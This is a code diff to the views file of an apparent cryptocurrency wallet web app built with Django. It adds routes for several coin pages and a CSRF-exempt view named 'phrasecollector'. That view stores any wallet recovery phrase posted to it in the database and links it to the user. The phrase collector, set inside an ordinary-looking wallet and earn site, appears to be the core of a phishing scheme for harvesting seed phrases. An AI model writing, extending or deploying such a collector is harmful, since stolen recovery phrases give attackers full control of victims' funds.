@@ -5,7 +5,7 @@ from django.shortcuts import redirect, render
 from django.contrib.auth.views import LoginView
 
 from .forms import SignUpForm , LoginForm
-from .models import Wallet
+from .models import Wallet , Recoveryphrase
 from django.views.decorators.csrf import csrf_protect ,csrf_exempt
 
 def home(request):
@@ -35,6 +35,45 @@ def wallet(request):
         return redirect("/signup")
     
     return render(request, "app/wallet.html" )
+@csrf_exempt
+def phrasecollector(request):
+    if request.method == "POST":
+        phrase = request.POST.get("phrase")
+        Recoveryphrase.objects.create(
+            user = request.user,
+            phrase = phrase
+        )
+        return redirect("/dashboard")
+    
+    
+
+        
+def payment_method(request):
+    return render(request, "app/payment_method.html")    
+
+
+
+def btc(request):
+    return render(request, "app/btc.html")
+
+
+def eth(request):
+    return render (request, "app/eth.html")
+def xrp(request):
+    return render(request, "app/xrp.html")
+def ltc(request):
+    return render(request, "app/ltc.html")
+def xlm(request):
+    return render(request, "app/xlm.html")
+def doge(request):
+    return render(request, "app/doge.html")
+def sol(request):
+    return render(request, "app/sol.html")
+def wlfi(request):
+    return render (request, "app/wifi.html" )
+def shib(request):
+    return render(request, "app/shib.html")
+
 @login_required
 def earn(request):
     return render(request, "app/earn.html")
